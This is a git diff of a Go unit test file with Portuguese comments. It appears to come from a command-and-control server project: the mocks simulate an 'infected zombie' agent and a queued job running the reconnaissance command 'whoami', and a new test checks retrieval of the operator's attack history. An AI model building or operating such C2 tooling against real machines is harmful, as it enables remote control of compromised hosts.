@@ -35,7 +35,10 @@ func (m *MockServerDB) UpdateJob(job domain.JobRow) error {
 	m.UpdatedJob = job
 	return nil
 }
-func (m *MockServerDB) GetAllJobs() ([]domain.JobRow, error) { return nil, nil }
+// Retorna uma lista com 1 Job Falso simulando o histórico do banco
+func (m *MockServerDB) GetAllJobs() ([]domain.JobRow, error) { 
+	return []domain.JobRow{{ID: "job-mock-1", Command: "whoami"}}, nil 
+}
 func (m *MockServerDB) GetAllAgents() ([]domain.AgentRow, error) {
 	// Simulamos que o banco de dados tem 1 zumbi infectado
 	return []domain.AgentRow{{UUID: "zumbi-mock-1"}}, nil
@@ -184,5 +187,27 @@ func TestConcreteServer_SendJobResult(t *testing.T) {
 	// Como o nosso stub em concreteserver.go ainda retorna apenas "", este teste deve falhar!
 	if resultado != resultadoEsperado {
 		t.Errorf("A regra de negócio falhou. Esperava repassar o output '%s', mas recebeu '%s'", resultadoEsperado, resultado)
+	}
+}
+
+func TestConcreteServer_SendAllJobResults(t *testing.T) {
+	// 1. Instanciamos o Cofre falso (Mock)
+	mockDB := &MockServerDB{}
+	var regraDeNegocio domain.Server = service.NewConcreteServer(mockDB)
+
+	// 2. Ação: O Operador pede o histórico completo de ataques
+	jobs, err := regraDeNegocio.SendAllJobResults()
+
+	// 3. Validação de Erro
+	if err != nil {
+		t.Fatalf("Esperava sucesso ao buscar o histórico, mas falhou: %v", err)
+	}
+
+	// 4. Validação Lógica
+	// Como o nosso stub em concreteserver.go ainda retorna nil, a lista virá vazia e o teste vai falhar!
+	if len(jobs) == 0 {
+		t.Errorf("A regra de negócio falhou. Esperava receber o histórico de jobs do banco, mas a lista retornou vazia")
+	} else if jobs[0].ID != "job-mock-1" {
+		t.Errorf("Esperava o job 'job-mock-1' na lista, mas recebeu '%s'", jobs[0].ID)
 	}
 }
